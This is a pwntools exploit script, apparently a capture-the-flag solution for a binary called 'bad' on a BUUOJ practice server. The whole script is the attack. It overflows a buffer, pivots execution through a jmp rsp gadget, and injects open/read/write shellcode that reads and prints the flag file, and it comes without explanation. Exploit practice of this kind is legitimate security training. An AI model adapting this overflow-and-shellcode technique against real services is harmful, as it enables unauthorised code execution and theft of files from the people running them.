#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.01.31 13.59.25
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	elf = ELF('./bad')
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	sh = process('./bad')
else:
	elf = ELF('./bad')
	sh = remote('node3.buuoj.cn',27877)



def pwn():
	PopRdi = 0x0000000000400b13
	JmpRsp = 0x0000000000400A01

	bss = 0x601000

	Open = asm(shellcraft.open('./flag'))
	Read = asm(shellcraft.read(3,bss+0x100,0x50))
	Write = asm(shellcraft.write(1,bss+0x100,0x50))
	read = asm(shellcraft.read(0,bss,0x100))
	padding = (read + asm("mov rax,0x601000;call rax")).ljust(0x20,'\x00') + p64(0xdeadbeef) + p64(JmpRsp) + '\xe9\xcb\xff\xff\xff'
	sh.send(padding)
	# gdb.attach(sh,'b*0x0000000000400A16')	
	sh.sendline(Open + Read + Write)



if __name__ == '__main__':
	pwn()
	sh.interactive()

